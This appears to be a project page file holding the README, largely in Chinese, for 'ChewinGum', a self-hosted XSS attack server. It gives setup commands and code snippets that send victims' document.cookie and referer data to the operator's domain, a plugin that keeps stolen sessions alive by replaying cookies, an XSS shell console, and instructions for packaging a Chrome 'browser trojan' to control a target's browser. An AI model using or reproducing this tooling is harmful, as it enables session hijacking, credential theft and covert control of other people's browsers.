{"name":"ChewinGum","tagline":"ChewinGum","body":"# ChewinGum [alpha][0.2034][1140504]\r\n\r\nName\r\n----\r\n***ChewinGum - individual XSS Server***\r\n\r\nStartup\r\n-------\r\n    python ./config.py install [ salt filekeyPath | -h ]\r\n    python ./chewingum.py [ host port debug | -h ]\r\n\r\nDependencies\r\n------------\r\n* [Bottle-0.12](http://bottlepy.org/)\r\n* [Bottle-websocket](https://github.com/zeekay/bottle-websocket/)\r\n* [GeventWebSocketServer](http://sdiehl.github.io/gevent-tutorial/)\r\n\r\n\r\n  unnecessaries\r\n  -------------\r\n    * [Beaker](http://beaker.rtfd.org/)\r\n\r\nReference\r\n---------\r\n* (Gum.js) - [xss.js](http://zone.wooyun.org/content/2113)\r\n* (get_info.js) - [BeEF](http://beefproject.com/)\r\n* (wec_cssbug.html) - [CSS3事件的消息回调BUG](http://www.web-tinker.com/article/20339.html)\r\n* (get_networkip.js) - [Network IP Address via ipcalf.com](http://net.ipcalf.com/)\r\n\r\nHelptext\r\n--------\r\n\r\n**1.Login**\r\n\r\n采用filekey验证, 上传filekey或输入URL便可登录.\r\n\r\n**2.Server**\r\n\r\nserver处代码会直接在项目触发时执行,  \r\n最终会将变量serverinfo和变量browserinfo保存至数据库,  \r\n格式需为json/dict格式\r\n\r\n    {'name':'value'}\r\n\r\n如:\r\n\r\n    serverinfo = {\r\n\t    'referer':b64encode(str(request.headers.get('Referer'))),\r\n    \t'ctime':b64encode(str(ctime()))\r\n\t}\r\n\tbrowserinfo = {\r\n    \t'cookie':b64encode(str(request.forms.get('cookie')))\r\n\t}\r\n\r\n**3.Server code keyword**\r\n\r\nifstatus  \r\n对变量ifstatus赋值, 会触发对应status.  \r\n如:\r\n\r\n\tifstatus = 404\r\n\r\nreturns  \r\n对变量returns赋值，在iferror为空的情况下, 会返回对其赋值的内容.  \r\n如:\r\n\r\n\treturns = '<script>alert(1)</script>'\r\n\r\ngum.backinfo  \r\n客户端的关键字，是一个字典，默认用来暂时记录返回的信息。  \r\n当返回之后最好清空它。\r\n\r\n    gum.backinfo = {};\r\n\r\n**4.Project name and Object name**\r\n\r\nproject 的项目名需是xss触发处的url或是domain.  \r\n$default是默认项目, xss触发时若未发现对应项目则按照此配置进行.\r\n\r\n\tobject 的项目名可随意更改.\r\n\r\n**5.Plugins**\r\n\r\n可以这样导入server扩展,\r\n\r\n\twith open('./static/serv/get_info.py') as files: exec files.read()\r\n\r\n也可以这样\r\n\r\n    from static.serv.email_remind import send_mail\r\n    send_mail(gum_emailremind)\r\n\r\n>    具体看扩展的写法\r\n\r\n可以这样导入browser插件,\r\n\r\n\tgum.script('http://' + gum.domain + '/static/brows/tool_boomerang.js')\r\n\r\n\r\n这样给browser插件传参,\r\n\r\n\tgum_boomerang = {\r\n\t\t'object_url':'http://localhost/xss',\r\n\t\t'post':{'xss':'yes', 'csrf':'no'},\r\n\t\t'eval':function(){alert(1)}\r\n\t}\r\n\r\n同样的方法给server扩展传参,\r\n\r\n\tgum_keepsession = {\r\n\t\t'url':referer,\r\n\t\t'session':cookie,\r\n\t\t'data':{'a':'b'},\r\n\t\t'frequency':300,\r\n\t\t'endate':'2013-12-12 15:17:00'\r\n\t}\r\n\r\n**6.Set code**\r\n\r\n这样发送browser info,\r\n\r\n    gum.post('http://' + gum.domain + '/ing', {'cookie':document.cookie})\r\n\r\n单次接收browser info可以参考上面的2.server  \r\n也可以这样\r\n\r\n    browserinfo['infoname'] = b64encode(str(request.forms.get('infoname')))\r\n\r\n多次接收browser info可以像这样,\r\n\r\n    info_cookie = str(request.forms.get('cookie'))\r\n\tsessionid[referer][1]['cookie'] = info_cookie\r\n\tbrowserinfo = b64encode(sessionid.get(referer))\r\n\r\n>\t不推荐使用多次接收，默认已关闭。\r\n\r\n**7.Easy example**\r\n\r\n使用基本探针:\r\n\r\nserver:\r\n\r\n    with open('./static/serv/get_info.py') as files: exec files.read()\r\n\r\nbrowser:\r\n\r\n    gum.script('http://' + gum.domain + '/static/brows/get_info.js', function(){\r\n        gum.post('http://' + gum.domain + '/ing', gum.backinfo);\r\n        gum.backinfo = {};\r\n    })\r\n\r\n**8.Console**\r\n\r\njavascript文件在\r\n\r\n    ./static/brows/onexsshell.js\r\n\r\n>    尚在测试阶段。\r\n\r\n**9.Browser trojan**\r\n\r\nchrome  \r\n修改./trojan/chrome/gum.js中的{{domain}}为你的chewingum的域名及端口  \r\n使用chrome or chromium打包  \r\n安装在目标的浏览器后，使用console即可操作目标浏览器。  \r\n\r\n>    尚在测试阶段\r\n\r\n**10.Plugins header specification**\r\n\r\n    Author[Reference] - Date\r\n        Name - Dependencies\r\n                - Synopsis\r\n            Example\r\n                and\r\n            Dependencies Plus\r\n\r\n>   好吧我知道不会有人帮我写插件的...\r\n","google":"Gum, XSS","note":"Don't delete this file! It's used internally to help with page regeneration."}